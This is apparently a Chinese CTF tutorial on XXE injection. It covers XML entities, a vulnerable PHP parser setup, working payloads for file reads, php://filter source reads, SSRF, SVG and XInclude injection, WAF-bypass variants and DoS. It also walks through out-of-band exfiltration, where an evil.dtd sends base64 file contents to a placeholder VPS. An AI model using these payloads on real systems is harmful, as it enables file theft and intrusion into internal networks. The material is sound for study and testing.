---

title: XXE
date: 2026-07-15
categories: [web安全, 常见漏洞]
type: tech
---




# 1. XXE

XXE（XML外部实体注入）发生在后端解析XML时加载了你定义的外部实体。它可以读文件、打内网、甚至造成拒绝服务。

XXE（XML External Entity Injection，XML 外部实体注入）是一种针对 XML 解析器的漏洞。当服务器解析用户提交的 XML 数据时，如果允许引用外部实体且没有做过滤，攻击者可以读取服务器本地文件、探测内网端口、发起 SSRF 请求。

## 1.1 XML 基础

XML 是一种标记语言，用自定义标签描述数据。一个最简单的 XML 文档：

```xml
<?xml version="1.0" encoding="UTF-8"?>   <!-- XML 声明 -->
<user>                                     <!-- 根元素（自定义标签） -->
    <name>zhangsan</name>
</user>
```

XML 可以在文档头部用 DTD（Document Type Definition）定义"实体"——类似于变量，定义一次，在文档里用 `&实体名;` 引用：

```xml
<!-- 内部实体：把值直接写进 DTD -->
<!DOCTYPE foo [
  <!ENTITY name "zhangsan">
]>
<foo>&name;</foo>   <!-- 解析后变成 <foo>zhangsan</foo> -->

<!-- 外部实体：用 SYSTEM 引用外部资源；是否读取和替换取决于解析器选项 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>    <!-- 解析后变成 /etc/passwd 的内容 -->
```

外部实体是 XXE 的核心——`SYSTEM` 后面可以写系统标识符（通常是 URI）。只有解析器启用了 DTD/实体加载与实体替换，并且对应 URI Scheme 可用时，解析器才会读取资源；不能把所有协议和所有解析器都视为默认可用。

## 1.2 漏洞成因

PHP 中典型的有漏洞写法：

```php
<?php
$xml = $_POST['xml'];                // 直接接收用户输入的 XML
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); // 显式加载 DTD 并替换实体
echo $dom->textContent;              // 输出解析结果（所以能回显文件内容）
?>
```

漏洞是否成立同时取决于 PHP 绑定的 libxml2 版本和解析选项。libxml2 2.9 起默认不做外部实体替换，PHP 8 使用的 libxml2 版本也已具备这一默认行为；但代码显式传入 `LIBXML_NOENT`、`LIBXML_DTDLOAD` 等选项，仍可能重新启用危险能力。

```php
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
```

三个标志位的含义：

- `LIBXML_NOENT`：让解析器**替换**XML 中的实体引用为实际内容（不加这个标志实体不会被展开，`&xxe;` 保持原样输出）
- `LIBXML_DTDLOAD`：允许加载**外部 DTD**（Blind XXE 需要加载远程 DTD 文件）
- `libxml_disable_entity_loader()`：旧环境中的全局实体加载开关；PHP 8.0 起已弃用，不能把"PHP 8 必须调用 `false`"当成利用条件。现代代码应避免危险解析标志，并在需要阻断网络时结合 `LIBXML_NONET`

## 1.3 常见攻击方式

**1. 读取本地文件（有回显场景）**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<foo>&xxe;</foo>
```

**2. 读取 PHP 源码（php://filter 包装）**

XML 外部实体读取的是文件字节，并不会把 PHP 源码交给 PHP 解释器执行。使用 `php://filter` 做 base64 的主要原因，是避免源码中的 `<`、`&`、非文本字节等破坏 XML 结构，并便于稳定外带：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<foo>&xxe;</foo>
```

拿到 base64 结果后解码即可得到 PHP 源码。同时 `php://filter` 也能用来绕过 `file://` 关键词过滤。

**3. Blind XXE（无回显，OOB 带外）**

服务器解析了 XML 但响应中不返回实体内容（比如只返回 "OK"），需要用带外方式把数据传出来。

发给目标服务器的 XML：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://你的VPS/evil.dtd">
  %dtd;
]>
<foo></foo>
```

你的 VPS 上的 `evil.dtd`：

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///flag">
<!ENTITY % req "<!ENTITY &#x25; send SYSTEM 'http://你的VPS/?c=%file;'>">
%req;
%send;
```

> **为什么这里全用 `%` 而不是 `&`**：XML 中有两种实体——`&实体名;`（通用实体，用在文档正文里）和 `%实体名;`（参数实体，只能用在 DTD 内部）。`evil.dtd` 整个文件就是一段纯 DTD，没有文档正文，所以定义和引用全部用 `%`。第二行的 `&#x25;` 是 `%` 的字符引用写法——因为在实体定义的字符串值内部不能直接写 `%`（会被当作引用去解析），用 `&#x25;` 替代。

整个过程分四步：

| 步骤 | 动作 | 结果 |
|---|---|---|
| 1 | 目标服务器请求 `evil.dtd` | 拉取到 DTD 内容，开始解析 |
| 2 | 解析 `% file` | 读取 `/flag` 并 base64 编码，`%file;` = 编码后字符串 |
| 3 | 解析 `% req`，执行 `%req;` | 定义 `%send` 实体，其 URL 中拼接了 `%file;` |
| 4 | 执行 `%send;` | 服务器向 `http://你的VPS/?c=<base64>` 发起请求 |

**为什么要用 base64 编码外带**：文件里可能包含 `#`、换行和 XML 特殊字符，直接拼进系统标识符容易产生 URI 或 DTD 解析错误。base64 能避开大部分 XML 特殊字符；但标准 base64 的 `+`、`/`、`=` 仍可能需要 URL 编码，并且较大文件还会受 URI 长度限制。

**4. 内网探测 / SSRF**

把外部实体的 `SYSTEM` 目标指向内网地址，XML 解析器会用服务器自身的网络权限去请求这个地址。和直接自己访问不同——你的电脑访问不了的内网服务（如 `127.0.0.1:6379` Redis、`169.254.169.254` 云元数据），服务器自己可能可以。

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<foo>&xxe;</foo>
```

**5. SVG 文件上传 XXE**

SVG 图片本质是 XML 文档，但"允许上传 SVG"本身不足以触发服务器端 XXE。只有网站在服务端使用启用了外部实体的 XML 解析器、转换器或图片处理库读取 SVG 时，下面的 payload 才可能读取服务器文件：

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <desc>&xxe;</desc>
  <rect width="100" height="100" fill="black"/>
</svg>
```

如果文件只是按静态资源返回，访问 SVG URL 通常不会让服务器重新解析实体，浏览器也不能因此读取服务器本地 `/flag`。`<desc>` 只是 SVG 的描述元素，不是保证可见的回显通道；需要结合服务端处理后的响应、转换产物或带外请求判断。

## 1.4 XXE 支持的各种协议

外部实体的 `SYSTEM` 关键字后面可以接多种协议，不同 PHP 环境和扩展支持的不同，CTF 中常用的有：

| 协议 | 用途 | 示例 |
|---|---|---|
| `file://` | 读取本地文件 | `file:///etc/passwd` |
| `http://` | SSRF / 带外探测 | `http://127.0.0.1:8080/admin` |
| `php://filter` | 读取 PHP 源码 | `php://filter/convert.base64-encode/resource=config.php` |
| `expect://` | 注册了 expect 扩展且 XML 加载器使用 PHP Stream 时可能执行命令 | `expect://id` |
| `ftp://` | FTP 请求（可用于带外探测） | `ftp://your-vps.com/data` |
| `data://` | PHP Stream 可用且配置允许时读取内联数据 | `data://text/plain,test` |

`gopher://` 是 cURL/SSRF 中常见的协议，但它不是 PHP 默认注册的 Stream Wrapper，不能直接写成 PHP/libxml XXE 的通用能力。最终应以 `stream_get_wrappers()`、解析器实现和出网策略为准。

## 1.5 常见绕过方式

**1. 系统标识符编码与加载器差异**

XML 规范不会在 `SYSTEM` 的引号字符串中展开字符引用或实体引用，因此下面这种"把 `file` 编码后重新拼成协议"的写法在标准解析器中不成立：

```xml
<!-- 不要当成通用绕过：解析器看到的仍是字面量 &#x66;... -->
<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;:///etc/passwd">
```

URI 百分号解码和空字节处理则取决于具体 URI 加载器与旧版本缺陷，不能当成稳定技巧：

```xml
<!ENTITY xxe SYSTEM "file:%2f%2f/etc/passwd">     <!-- 仅在加载器会按预期解码时测试 -->
<!ENTITY xxe SYSTEM "file:///etc/passwd%00">      <!-- 仅限存在空字节缺陷的历史环境 -->
```

**2. 改 XML 声明编码绕过关键词**

后端如果对 `flag`、`file://` 做 `stripos` 字符串检测，切换 XML 编码可以让这些关键词的字节表示完全变化，正则/字符串匹配直接失效：

```xml
<?xml version="1.0" encoding="UTF-16BE"?>
<!-- 整个文档按 UTF-16BE 编码后，关键词的字节表示会变化 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag">
]>
<foo>&xxe;</foo>

```

注意：只修改 XML 声明不会改变后续文本的实际编码。使用 UTF-16BE 时，整个请求体必须真的按 UTF-16BE 编码，并让 Content-Type、BOM/编码声明与字节流保持一致；解析器是否支持该编码也要实测。

**3. 双实体拼接绕过**

在标准 XML 解析器中，`SYSTEM` 字面量内部不会展开普通实体，因此下面的拼接通常不生效：

```xml
<!DOCTYPE foo [
  <!ENTITY file "file://">
  <!ENTITY path "/etc/passwd">
  <!ENTITY xxe SYSTEM "&file;&path;">
]>
```

只有确认目标使用非标准或存在缺陷的宽松解析器时才值得测试，不能把它列为通用绕过。

**4. CDATA 包裹绕过特殊字符**

如果外部实体读取的文件本身包含 `<`、`&` 等 XML 特殊字符，把它直接展开进元素正文可能导致解析失败。直觉上会想用 CDATA：

```xml
<foo><![CDATA[&xxe;]]></foo>
```

但这不会工作：CDATA 内的 `&xxe;` 只按普通文本处理，不会展开。反过来，试图通过多个实体"拼出" `<![CDATA[` 和 `]]>` 也不具备可移植性；实体替换文本通常不会被重新当成新的 CDATA 标记解析，很多示例还会直接违反 DTD 语法。

PHP 环境中更可靠的做法是先把目标文件编码成不含 XML 结构字符的文本：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file">
]>
<foo>&xxe;</foo>
```

拿到结果后再在本地 base64 解码。其他语言环境没有 `php://filter` 时，应寻找该解析器或应用提供的编码/带外通道，而不是默认套用 CDATA 拼接。

**5. 把攻击逻辑移到外部 DTD（WAF 绕过）**

把主要逻辑移到外部 DTD 可以减少请求体中的直接特征，但不保证绕过 WAF：防护设备仍可能拦截 `DOCTYPE` / 外部地址，服务器也可能禁止出网或禁用外部 DTD。

"内"指的是 XML 里 `[ ]` 中间的内联 DTD，"外"指的是你 VPS 上单独托管的 `.dtd` 文件。

**发一个"干净"的 XML 给目标服务器：**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://你的VPS/wrapper.dtd">
<foo>&send;</foo>
```

WAF 视角：XML 正文里没有 `<!ENTITY`、没有 `file://`、没有可疑关键词。`&send;` 只是一个普通的实体引用，名称无害。`<!DOCTYPE foo SYSTEM "...">` 只是引用了一个外部 DTD，看起来像是正常的业务配置。

**你的 VPS 上 `wrapper.dtd` 负责所有攻击逻辑：**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag"> <!-- ① 编码读取 /flag -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://你的VPS/?c=%file;'>">          <!-- ② 拼出带数据的 URL -->
%all;                                                            <!-- ③ 执行，定义 send -->
```

**完整流程：**

1. 你发送 XML → 如果 WAF 未拦截外部 DTD 引用，请求进入应用
2. 服务器收到 XML，看到 `SYSTEM "http://你的VPS/wrapper.dtd"` → 向你的 VPS 发起 HTTP 请求拉取 DTD 内容
3. 服务器解析 `wrapper.dtd`：先定义 `%file;`（`/flag` 的 base64），再通过 `%all;` 定义了 `send` 实体（URL 里拼了 `%file;`）
4. 服务器继续解析 XML 正文，遇到 `&send;` → 向 `http://你的VPS/?c=<flag的base64>` 发起 HTTP 请求
5. 你在 VPS 日志里看到带 flag 的请求

关键：这是利用检测范围差异的思路，不是"WAF 一定看不到"的保证。

**6. 格式混淆绕过 WAF**

如果防护只做脆弱的字符串匹配，XML 允许的部分空白、引号形式和注释位置可能造成检测差异；但不能拆开 `<!DOCTYPE`、`SYSTEM` 等语法关键字，也不能把注释放进任意语法位置。

```xml
<!-- 基础版 -->
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

<!-- 在语法允许空白的位置换行 -->
<?xml version="1.0"?>
<!DOCTYPE
 foo
 [
 <!ENTITY
 xxe
 SYSTEM
 "file:///etc/passwd"
 >
 ]
 >
<foo>&xxe;</foo>

<!-- 注释只能放在 XML 语法允许的位置，例如声明之间 -->
<?xml version="1.0"?>
<!-- 123 -->
<!DOCTYPE foo [
<!-- 123 -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!-- 123 -->
]>
<foo>&xxe;</foo>

<!-- XML 允许单引号 -->
<!ENTITY xxe SYSTEM 'file:///etc/passwd'>

<!-- 在语法允许的位置增加空格 -->
<!ENTITY   xxe   SYSTEM   "file:///etc/passwd"   >
```

## 1.6 怎么判断是否有 XXE

- **看请求体**：抓包检查 POST 请求体是否是 XML 格式（以 `<?xml` 开头、Content-Type 为 `application/xml` 或 `text/xml`）
- **改 Content-Type 测试**：即使原始请求的 Content-Type 不是 XML，也尝试把请求体替换为测试 XML 并改 Content-Type 为 `application/xml`，看服务器是否解析
- **看响应**：正常 XML 请求有业务响应 → 有回显 XXE；有响应但无内容变化 → 可能是 Blind XXE，上带外方案
- **SVG 上传入口**：只有服务端会用存在风险的 XML/图片处理器解析 SVG 时才可能触发 XXE；单纯静态存储并访问文件路径通常不成立
- **XInclude 路径**（不依赖 DOCTYPE 的文件读取）：这是 XXE 的一个变种，用于你只能控制 XML 文档的**一部分内容**、无法在文档开头插入 `<!DOCTYPE` 声明的场景。比如后端把用户输入嵌入到一个已有的 SOAP 消息体里，或者拼进一个固定模板的 XML 中间位置。

XInclude 是 W3C 标准规定的另一种"引入外部内容"的机制，和 DTD 外部实体完全独立——它不需要 `<!DOCTYPE`，不需要 `<!ENTITY`，只需要在 XML 元素中声明 XInclude 命名空间并使用 `<xi:include>` 标签：

```xml
<!-- 这段可以直接插在任意 XML 元素内部，不需要改文档顶部 -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

- `xmlns:xi="http://www.w3.org/2001/XInclude"` 声明了 `xi` 这个前缀对应 XInclude 规范
- `<xi:include href="..." />` 让解析器在解析到此处时去读取 `href` 指向的资源并嵌入
- `parse="text"` 表示把目标文件内容当纯文本嵌入（不加这个默认会当 XML 解析，格式不对就报错）

**和普通 XXE 的对比：**

| | 普通 XXE（实体） | XInclude |
|---|---|---|
| 需要 `<!DOCTYPE` | 是 | 否 |
| 需要 `<!ENTITY` | 是 | 否 |
| 能读非 XML 文件 | 是 | 需加 `parse="text"` |
| 生效条件 | 外部实体未禁用 | XInclude 处理器启用 |
| 适用场景 | 能控制 XML 头部 | 只能控制 XML 局部 |

**CTF 中怎么考：**

XInclude 不是默认开启的，所以题目通常会给你源码让你看到 `LIBXML_XINCLUDE` 标志或 `$dom->xinclude()` 调用。

典型注入场景：后端把你输入的字符串塞进一个固定的 XML 模板中间，例如：

```
后端拼接: <data><name>你的输入</name></data>
```

你输入：`</name><xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///flag" parse="text"/><name>`

最终拼成：`<data><name></name><xi:include .../><name></name></data>`

## 1.7 OOB XXE 完整 VPS 操作流程

以阿里云 ECS 为例，以下 `你的VPS` 替换为你的服务器公网 IP。完整操作：

**1. 安全组放行端口**

阿里云控制台 → ECS → 实例 → 安全组 → 配置规则 → 入方向 → 新增：端口 `8080`，授权对象 `0.0.0.0/0`，保存。

**2. SSH 登录并创建 evil.dtd**

```bash
ssh root@你的VPS
mkdir -p /var/www/html && cd /var/www/html
```

创建 `evil.dtd`（用 php://filter 做 base64 编码避免 Invalid URI）：

```bash
cat > evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///flag">
<!ENTITY % req "<!ENTITY &#x25; send SYSTEM 'http://你的VPS:8080/?c=%file;'>">
%req;
%send;
EOF
```

`&#x25;` 就是 `%`——因为在 XML 实体的值内部不能直接写 `%`，用字符引用替代。

**3. 启动 HTTP 服务**

```bash
cd /var/www/html
python3 -m http.server 8080
# 保持终端不关，每次请求都会打印在屏幕上
```

**4. 题目页面提交 payload**

发给目标服务器的完整 XML：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
  <!ENTITY % dtd SYSTEM "http://你的VPS:8080/evil.dtd">
  %dtd;
]>
<r></r>
```

**逐行解释：**

- `<!DOCTYPE r [ ... ]>` —— 声明 DTD 区域，`r` 是随便起的名，可以是任意字符串
- `<!ENTITY % dtd SYSTEM "http://你的VPS:8080/evil.dtd">` —— 定义一个**参数实体**叫 `dtd`，它的值是去你的 VPS 拉 `evil.dtd` 的内容。注意这里用 `%`（参数实体），因为这是在 DTD 内部定义、在 DTD 内部使用
- `%dtd;` —— 执行参数实体引用，解析器向你的 VPS 发起 HTTP 请求把 `evil.dtd` 拉下来，并**把拉下来的内容当作 DTD 的后续部分继续解析**。这是整个 OOB 攻击的关键——evil.dtd 里的四行就是从这一行"注入"进 DTD 的
- `<r></r>` —— 文档正文，这里为空，因为读取 /flag 和回传数据的逻辑全在 evil.dtd 里完成了，正文不需要引用任何实体

**evil.dtd 逐行解释：**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///flag">
<!ENTITY % req "<!ENTITY &#x25; send SYSTEM 'http://你的VPS:8080/?c=%file;'>">
%req;
%send;
```

| 行 | 代码 | 解释 |
|---|---|---|
| 1 | `<!ENTITY % file SYSTEM "php://...resource=file:///flag">` | 定义参数实体 `%file`，它的值是 `/flag` 内容的 **base64 编码**。这样可以避开大部分 XML 特殊字符；标准 base64 的 `+`、`/`、`=` 仍可能需要根据接收端做 URL 编码，长文件还会受 URI 长度限制 |
| 2 | `<!ENTITY % req "<!ENTITY &#x25; send SYSTEM 'http://.../?c=%file;'>">` | 定义参数实体 `%req`，它的**替换文本**是另一条实体定义语句。`&#x25;` 是字符引用，解析后变成 `%`——因为这段文本现在是字符串值，如果直接写 `%` 会被当场当作参数实体引用去解析（但 `%send` 还没定义所以会报错），用 `&#x25;` 延迟了 `%` 的生效时机 |
| 3 | `%req;` | 执行参数实体引用，展开 `%req` 的替换文本。展开后 DTD 里**多了一条 `<!ENTITY % send SYSTEM 'http://你的VPS:8080/?c=<base64的flag>'>`**——注意此时 `%file;` 已经被替换成了实际内容。至此 `%send` 实体定义完成 |
| 4 | `%send;` | 执行参数实体引用，解析器向 `http://你的VPS:8080/?c=<base64的flag>` 发起 HTTP GET 请求。因为 `%send` 的值是一个外部 SYSTEM，解析器去请求这个 URL 来获取"实体内容"——但实体内容本身不重要，重要的是**请求的 URL 里携带了 flag** |

**完整流程串联：**

你发 XML（只引用外部 DTD，自身不带攻击逻辑）→ 服务器解析 `%dtd;`，拉取 evil.dtd → evil.dtd 的四行依次执行：读文件并编码 → 构造带 flag 的 URL → 定义 `%send` → 执行 `%send` 触发带外 HTTP 请求 → 你的 VPS 日志里出现 `?c=<base64 的 flag>`

**5. 在服务器上接收 flag**

终端会先打印 `GET /evil.dtd`，接着打印：

```
GET /?c=ZmxhZ3t4eHh4LXh4eHgteHh4eC0uLi59 HTTP/1.1
```

解码 `c` 参数：

```bash
echo "ZmxhZ3t4eHh4LXh4eHgteHh4eC0uLi59" | base64 -d
# flag{xxxx-xxxx-xxxx-...}
```

没有 VPS 也可以用 Webhook.site 或 RequestBin 等在线服务替代，把 evil.dtd 里的 URL 换成对应的接收地址即可。

**6. 常见错误与排查**

| 现象 | 可能原因 | 检查方法 |
|---|---|---|
| 一直卡在"解析中"或 Connection timed out | 题目服务器连不上你的 VPS | 确认安全组放行了端口、`http.server` 正在运行、evil.dtd 路径正确 |
| 返回 FAIL 或 "FAIL" | 解析失败（DTD 拉取超时、实体错误、Invalid URI） | Blind XXE 不回显细节是正常的，检查 evil.dtd 语法和 URL |
| Invalid URI 错误 | flag 中含有 `}`、`#` 等特殊字符拼进 URL 导致非法 | 用 `php://filter/convert.base64-encode` 先编码再外带 |
| VPS 收到了 DTD 请求但没有第二次带 flag 的请求 | DTD 中 `%file;` 或 `%send;` 执行失败 | 检查 evil.dtd 中的实体名是否匹配、`&#x25;` 写法是否正确 |

## 1.8 拒绝服务（DoS）场景

外部实体引用一个无限大的资源可以让解析器挂起或耗尽内存。CTF 中虽然少见，但也是 XXE 的一种利用方向：

```xml
<!-- 某些类 Unix 环境中读取随机设备可能阻塞或持续消耗资源，行为依赖实现 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<foo>&xxe;</foo>

<!-- 引用一个巨慢或无限大的 HTTP 响应 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://攻击者VPS/slow-endpoint">
]>
<foo>&xxe;</foo>
```
